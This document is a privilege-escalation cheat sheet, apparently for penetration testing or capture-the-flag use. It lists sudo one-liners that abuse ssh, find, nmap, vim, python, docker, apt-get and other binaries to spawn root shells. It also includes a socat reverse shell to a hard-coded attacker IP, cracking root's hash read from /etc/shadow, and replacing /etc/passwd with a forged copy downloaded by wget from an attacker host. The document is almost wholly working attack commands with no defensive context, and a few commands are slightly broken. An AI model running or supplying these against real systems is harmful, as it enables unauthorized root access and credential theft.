/usr/bin/ssh

``` bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

find

```
sudo find / etc/passwd -exec /bin/bash \;
```

Nmap

```
echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

Env

```
sudo env /bin/bash
```

Vim

```
sudo vim -c ':!/bin/bash'
```

Awk

```
sudo awk 'BEGIN {system("/bin/bash")}'
```

Perl

```
sudo perl -e 'exec "/bin/bash";'
```

Python

```
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

Less

```
sudo less /etc/hosts - !bash
```

Man

```
sudo man man - !bash
```

ftp

```
sudo ftp - ! /bin/bash
```

socat

```
Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234
Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
```

Zip

```
echo test > notes.txt
sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"
```

gcc

```
sudo gcc -wrapper /bin/bash,-s .
```

Docker

```
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

MySQL

```
sudo mysql -e '\! /bin/sh'
```

SSH

```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Tmux

```
Sudo tmux
```

pkexec

```
sudo pkexec /bin/bash
```

rlwrap

```
sudo rlwrap /bin/bash
```

xargs

```
sudo xargs -a /dev/null sh
```

anansi_util

```
sudo /home/anansi/bin/anansi_util manual /bin/bash  
```

apt-get

```
sudo apt-get update -o APT::Update::Pre-Invoke::=”/bin/bash -i”
```

flask run

```
echo 'import pty; pty.spawn(“/bin/bash”)' > flask.py
export FLASK_APP=flask.py
sudo /usr/bin/flask run
```

apache2

Victim

```
sudo apache2 -f /etc/shadow
Copy root's hash
```

Attacker

```
echo '<root's_hash>' > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

// Replace <root's_hash> with the hash that you copied 
```

Back to Victim

```
su root
id && whoami
```

Wget

Victim

```
cp /etc/passwd /tmp/passwd
cat /etc/passwd

```

Attacker

```
Copy /etc/passwd content and put in a local file called passwd
Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
Copy output of the above command 
edit passwd
Replace x in root's line with the copied output
Save the file
python -m SimpleHTTPServer 9000 // You can use any port
```

Victim

```
sudo wget http://<attacker_ip>:9000/passwd -O /etc/passwd
su root // Enter the new root password you generated (Example: NewRootPassword)
id && whoami
```